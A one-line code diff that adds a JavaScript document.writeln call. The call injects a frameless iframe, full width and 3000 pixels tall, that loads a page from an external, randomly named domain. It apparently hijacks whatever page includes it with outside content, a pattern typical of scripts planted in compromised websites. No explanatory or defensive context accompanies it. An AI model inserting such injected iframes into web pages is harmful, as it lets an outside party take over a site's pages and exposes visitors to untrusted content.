@@ -1,0 +1,1 @@
+document.writeln("        <iframe src=\'https://33333.bb667797.com/888.htm\' width=\'100%\' height=\'3000px;\' frameborder=\'0\' name=\'mainFrame\' id=\'mainFrame\' ></iframe>");
